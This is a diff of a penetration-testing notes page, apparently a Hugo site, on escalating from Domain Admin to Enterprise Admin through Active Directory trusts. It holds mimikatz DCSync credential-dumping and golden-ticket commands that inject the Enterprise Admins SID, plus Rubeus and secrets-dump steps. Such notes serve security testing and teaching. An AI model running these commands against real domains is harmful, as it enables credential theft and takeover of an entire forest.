@@ -6,7 +6,7 @@ tags: ["Kerberos", "Pass-The-Ticket", "Rubeus", "Domain Trust", "Golden Ticket",
 
 ### Privesc from DA (Domain Admin) to EA (Enterprise Admin)
 
-{{< tab set1 tab1 active >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### 1. Check trust relationships
@@ -71,6 +71,11 @@ SourceName     TargetName   TrustType TrustDirection
 corp.example.com example.com  ParentChild  Bidirectional
 ```
 
+```console
+# Check forest trust
+([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
+```
+
 #### 2. Get current and target domain SID
 
 ```console
@@ -98,7 +103,7 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-#### 3. Get parent machine account's hash
+#### 3. Get krbtgt hash
 
 ```console
 .\mimikatz.exe "lsadump::dcsync /all /csv" "exit"
@@ -133,7 +138,7 @@ Bye!
 
 ```console
 # Append '-519' to target domain SID (Enterprise Admins Group)
-.\mimikatz.exe "kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /rc4:<PARENT_HASH> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"
 ```
 
 ```console {class="sample-code"}
@@ -219,7 +224,7 @@ PS C:\programdata> .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EX
 
 #### 6. Secrets Dump
 
-{{< tab set2 tab1 active >}}Linux{{< /tab >}}
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
